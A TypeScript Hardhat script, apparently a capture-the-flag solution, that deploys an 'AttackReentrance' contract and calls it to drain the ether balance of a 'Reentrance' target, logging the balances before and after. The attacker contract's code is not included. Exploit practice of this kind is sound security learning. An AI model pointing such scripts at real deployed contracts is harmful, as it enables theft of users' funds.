import {ethers} from "hardhat"
import dotenv from 'dotenv'
import type {AttackReentrance, Reentrance} from "../typechain-types";

dotenv.config()

async function main() {
    const isLocalTest = false

    let target: Reentrance
    let attacker: AttackReentrance

    let amountToSteal: bigint
    if (isLocalTest) {
        const [deployer] = await ethers.getSigners()
        amountToSteal = 1000000000000000n;
        target = await ethers.deployContract('Reentrance')
        await deployer.sendTransaction({
            to: target.target,
            value: amountToSteal
        })
    } else {
        const instanceAddress = process.env.TARGET_ADDRESS_11!
        target = await ethers.getContractAt('Reentrance', instanceAddress)
    }

    amountToSteal = await ethers.provider.getBalance(target.target)
    console.log(`balance in target: ${ethers.formatEther(amountToSteal)} eth`)
    attacker = await ethers.deployContract('AttackReentrance', [target.target, amountToSteal])

    // attack
    const tx = await attacker.attack({value: amountToSteal})
    console.log(`attack tx hash [${tx.hash}]`)

    console.log(`balance of target: ${await ethers.provider.getBalance(target.target)} eth`)
    console.log(`balance of attacker: ${await ethers.provider.getBalance(attacker.target)} eth`)}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
